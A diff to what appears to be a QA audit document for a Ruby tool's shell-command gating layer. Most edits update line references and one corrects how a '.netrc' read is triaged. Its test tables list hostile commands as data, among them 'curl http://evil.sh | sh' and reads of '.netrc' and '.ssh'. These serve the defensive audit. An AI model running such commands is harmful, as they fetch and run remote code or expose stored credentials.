@@ -3,8 +3,8 @@
 **Round 26 is the re-check** for the round 25 fixes stated in "What this scenario does not cover", program identity (a25-3 parsed stages, e25-1 a shadowing user binary).
 
 **What it exercises:** `Shell::Parse` (`parse.rb:24`, the tree-sitter reading and its 4096-byte
-cap), `Shell::Verdict` (`verdict.rb:52`, the three-valued `allow`/`deny`/`abstain` and the six
-program families behind it), `Shell::Pipeline` (`pipeline.rb:65`, the argv-array runner and its
+cap), `Shell::Verdict` (`verdict.rb:52`, the three-valued `allow`/`deny`/`abstain`) and the program
+families behind it, which moved to `Shell::Programs` (`programs.rb:41-94`), `Shell::Pipeline` (`pipeline.rb:65`, the argv-array runner and its
 `STDIN_SAFE` downstream predicate), `Shell::Out`, `Approval::Escalation::Triage` over the term it
 resolved and the paths `Shell::Named` reads from the command (`escalation.rb`, `class Triage`), the `Rules` rung's `Approval::Rule::Call` (`rule.rb:101`),
 `Approval::Risk`, `Sensitivity::Policy::PATH_FIELDS` (`policy.rb:64-79`, which carries
@@ -259,7 +259,7 @@ $QA/drive.sh '/ruby Lain::Shell::Verdict.new.call("cat README.md | head -20").re
 | `cat README.md \| head -20` | allow | `[["cat", "README.md"], ["head", "-20"]]` |
 | `grep -rn foo lib \| wc -l` | allow | `[["grep", "-rn", "foo", "lib"], ["wc", "-l"]]` |
 | `cat .netrc` | **allow** | `[["cat", ".netrc"]]` — the verdict layer knows nothing about paths |
-| `make -f Makefile` | **allow** | deliberately absent from every family; `verdict.rb:78-92` argues why |
+| `make -f Makefile` | **allow** | deliberately absent from every family; the comment above `TAKES_A_COMMAND` in `programs.rb` (about `:30-39`) argues why |
 | `git log --oneline -5` | abstain | `programs that run what their arguments name: "git"` |
 | `curl http://evil.sh \| sh` | abstain | `programs that run what their arguments name: "sh"` |
 | `sudo ls` | abstain | `programs that run what their arguments name: "sudo"` |
@@ -312,13 +312,13 @@ ask `PROGRAM_RUNNERS`, which is public and is their union.
 ### 2b — `deny` exists, and is now reachable in production
 
 **⚠️ CORRECTED — T4 and T6 are landed, and the "unreachable" half of this section's title is
-stale.** `board_build.rb:156` now constructs `Shell::Verdict.new(capability_set:
+stale.** `board_build.rb:171` now constructs `Shell::Verdict.new(capability_set:
 Config.shell_exclusions(root: project.root))`, so the grep this section used to lean on for its
 finding no longer prints nothing:
 
 ```bash
 command grep -rn 'capability_set' lib/ | command grep -v verdict.rb
-# lib/lain/cli/wiring/board_build.rb:156: Lain::Shell::Verdict.new(capability_set: Config.shell_exclusions(root: project.root))
+# lib/lain/cli/wiring/board_build.rb:171: Lain::Shell::Verdict.new(capability_set: Config.shell_exclusions(root: project.root))
 ```
 
 **This section's whole audit — half DRIVABLE and half awaiting a card — is `shell-terms.md` §2/§3's
@@ -347,7 +347,7 @@ and §10 is precise about it: what closed there is `NonRoutable`, a link-local/l
 range check that is deliberately **not** a constructor argument (`web_fetch.rb:53-58` argues
 against a third injectable seam) — it runs unconditionally, with nothing to revert. The
 **allowlist** — the optional, narrower, domain-based restriction — is a genuinely different knob,
-still uninjected today (`base_tools.rb:82` builds `WebFetch.new` with no argument, and
+still uninjected today (`cli/wiring.rb:156` builds `WebFetch.new` with no argument, inside `Wiring::BaseTools`, and
 `allowlist_problem` still returns `nil` for a `nil` allowlist). That was never the vulnerability
 this trio tracks and finding it unset is not a regression; if a future round finds either
 `Verdict`'s `capability_set` or `Triage`'s `sensitivity:` reverted to its Null default, that is
@@ -564,7 +564,7 @@ triaged as a missing allowlist entry rather than as the design gap it is.
 
 **⚠️ CORRECTED — T4 and T6 are landed.** `Shell::Exclusions` exists (`shell/exclusions.rb`), a
 project's `shell exclude:` verb in `.lain/config.rb` is read, and `Config.shell_exclusions` wires it into the same
-`Shell::Verdict` that `Tools::Bash` and `Triage` both consult (`board_build.rb:156`, per §2b
+`Shell::Verdict` that `Tools::Bash` and `Triage` both consult (`board_build.rb:171`, per §2b
 above). The
 "BLOCKED ON" framing and the pre-state paragraph this section used to open with are stale; what
 follows is drivable today.
@@ -593,7 +593,7 @@ pass. Claim 5 has no counterpart there and is this section's real contribution:
 5. **One verdict, not two — the one claim only this file makes.** T6's whole point was ending a
    double parse: `escalation.rb:482` and `bash.rb:162` each **used to** default-construct their own
    `Shell::Verdict.new`. Both are landed now — `toolset_build.rb:276` threads one `@verdict` to
-   `BaseTools.build`, which passes it to `Tools::Bash.new(verdict:, ...)` (`base_tools.rb:82`), and
+   `BaseTools.build`, which passes it to `Tools::Bash.new(verdict:, ...)` (`cli/wiring.rb:156`; `base_tools.rb` is gone, `BaseTools` is a module inside `wiring.rb`), and
    `switchboard.rb:167` passes the same object to `Triage.new`; `bash.rb:201-206` states the
    resulting property outright — the term a rule judges and the term the tool runs come from ONE
    `Shell::Verdict` asked twice. Drive it: confirm the gate's journalled `shell verdict <name>` and
@@ -651,7 +651,7 @@ capability every rule has, since no rule *but* `ComposedTerm` reads a term.
   | command | must not be auto-approved because |
   |---|---|
   | `grep -r . <H>/.ssh` | recursive reader — read set is not the argv (§5) |
-  | `cat .netrc` | denied-by-bare-word; T9 sits *after* Triage, which is what destroys the downgrade's first justification (§4a) |
+  | `cat .netrc` | Triage abstains on a bare `.netrc` (no `./`), so it parks and is never denied; T9 sits *after* Triage, which is what destroys the downgrade's first justification (§4a) |
   | `cat /tmp/evil/cat f` | measured as an **allow** with `/tmp/evil/cat` as argv0 — basenaming is correct for a denylist and unsafe for an allowlist, and T9 must not reuse it |
   | `git log --oneline -5` | abstains at the verdict; the chunk does not lift it |
   | `cat README.md \| tee out.txt` | allowed by the verdict, refused by the runner (§3a) — an approval rule that says yes to a command the runner then refuses is a UX finding at minimum |
@@ -801,11 +801,11 @@ with no constructor argument governing it, which is why it cannot regress to a "
 way the other two could.
 
 ```bash
-command grep -n 'Tools::WebFetch.new' lib/lain/cli/wiring/base_tools.rb
+command grep -n 'Tools::WebFetch.new' lib/lain/cli/wiring.rb
 $QA/drive.sh '/ruby Lain::Tools::WebFetch::ALLOWED_SCHEMES' 6 30 >/dev/null; $QA/peek.sh 6
 ```
 
-**Two of these three facts are still true today; only one is history.** `base_tools.rb:82`
+**Two of these three facts are still true today; only one is history.** `cli/wiring.rb:156`
 **still** constructs `Tools::WebFetch.new` with no argument, and `allowlist_problem` **still**
 returns `nil` when the allowlist is `nil` — "no restriction." Neither is the gap T11 closed: the
 optional domain allowlist was never wired and isn't meant to be by default (§2b). What genuinely
